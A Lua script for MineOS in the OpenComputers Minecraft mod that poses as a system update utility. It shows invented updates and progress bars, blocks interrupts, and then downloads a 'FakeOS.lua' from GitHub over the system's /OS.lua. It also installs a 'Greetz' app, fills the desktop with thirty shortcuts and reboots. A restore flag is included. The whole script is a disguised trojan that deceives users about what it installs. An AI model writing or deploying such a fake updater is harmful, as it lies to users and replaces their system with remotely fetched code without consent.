
-- Import libraries
local GUI = require("GUI")
local system = require("System")
local paths = require("Paths")
local com = require("Component")
local event = require("event")
local fs = require("Filesystem")
local internet = require("Internet")

-- Define components
local gpu = com.gpu

-- Define component functions and lua functions too (also variables)
local getb,getf,set,fill,copy,setb,setf = gpu.getBackground,gpu.getForeground,gpu.set,gpu.fill,gpu.copy,gpu.setBackground,gpu.setForeground
local sel = select
local mx,my = gpu.getResolution()
local len = string.len
local wait = event.sleep

--------------------------------------------------------------------------------

function FUN()
  
  local cdir = fs.path(system.getCurrentScript())
  
  fs.makeDirectory("/MineOS/Greetz.app")
  internet.download("https://raw.githubusercontent.com/ocboy3/OC/main/OCHammer.app/Greetz.app/Icon.pic","/MineOS/Greetz.app/Icon.pic")
  internet.download("https://raw.githubusercontent.com/ocboy3/OC/main/OCHammer.app/Greetz.app/Main.lua","/MineOS/Greetz.app/Main.lua")
  
  
  internet.download("https://raw.githubusercontent.com/ocboy3/OC/main/OCHammer.app/FakeOS.lua","/OS.lua")
  
  for i = 1,30 do
    system.createShortcut(paths.user.desktop .. "GREETZ " .. tostring(i),"/MineOS/Greetz.app/")
  end
  
  wait(1)
  
end

event.interruptingEnabled = false

local current_line = 1

local TG_TITLE,TG_TABS

function terminalGui(title,tabs)
  TG_TITLE = title
  TG_TABS = tabs
  local prevB = select(1,gpu.getBackground())
  local prevF = select(1,gpu.getForeground())
  setb(0xFFFFFF)
  setf(0x000000)
  fill(1,1,mx,1," ")
  local tpos = 1
  set(3,1,title)
  tpos = tpos + len(title) + 4
  setf(0x5A5A5A)
  if tabs and #tabs > 0 then
    for _, thing in pairs(tabs) do
      set(tpos,1,thing)
      tpos = tpos + len(thing) + 3
    end
  end
  setb(prevB)
  setf(prevF)
end

function scroll(lines)
  if not lines then lines = 1 end
  copy(1,1,mx,my,0,0-lines)
  terminalGui(TG_TITLE,TG_TABS)
end

local te = {}

te.print = function(text)
  if current_line+1 > my then
    current_line = current_line-1
    scroll(1)
  end
  set(1,current_line+1,text)
  current_line = current_line + 1
  terminalGui(TG_TITLE,TG_TABS)
  return current_line
end

te.mline = function(line,text)
  gpu.set(1,line,text .. "                                                                                    ")
end

te.pline = function(timer,text)
  local pl_index = te.print("[ 00 ] " .. text)
  local num_thing = "00"
  for i = 1,99 do
    wait(timer/100)
    if i < 10 then
      num_thing = "0" .. tostring(i)
    else
      num_thing = tostring(i)
    end
    te.mline(pl_index,"[ " .. num_thing .. " ] " .. text)
  end
  wait(timer/100)
  te.mline(pl_index,"[ ok ] " .. text)
end

local pr_pr = print
local print = te.print
local mline = te.mline

setb(0x000000)
setf(0xFFFFFF)

gpu.fill(1,1,mx,my," ")
terminalGui("MineOS",{"Edit"})

wait(1)

local args,ops = system.parseArguments(...)

if ops["restore"] then
  print("Restoring /OS.lua")
  print("Please wait..")
  internet.download("https://raw.githubusercontent.com/IgorTimofeev/MineOS/master/OS.lua","/OS.lua")
  print("Restoring complete")
  print(" ")
  print("You have to follow the instuctions at https://github.com/ocboy3/OC/README.md")
  print("Please restart your computer manually. (just in case)")
else

print(" ")
print("MineOS update utility")
print(" ")
te.pline(math.random(3.75,6.15),"Preparing for update...")
print(" ")
print("Updates avaiable:")
print(" * MineOS Command Line")
print(" * MacOS Monterey type dock and GUI")
print(" * OneBoot for MineOS EFI")
print(" * OpenDefender")
print(" ")
print("These updates require 1.2 MB to install...")
print("Press any key to install..")

local lastEvt = {}

repeat
  lastEvt = {event.pull(1)}
until lastEvt[1] == "key_up"

print(" ")

print("Please do not turn off your PC.")
print("Working on updates...")

FUN()

wait(1)

print(" ")
print("MineOS has been sucessfully updated!")
print("Press any key to reboot...")

local lastEvt = {}

repeat
  lastEvt = {event.pull(1)}
until lastEvt[1] == "key_up"

print("Rebooting..")

require("computer").shutdown(true)

end

local lastEvt = {}

while true do
  lastEvt = {event.pull(1)}
end


local print = pr_pr
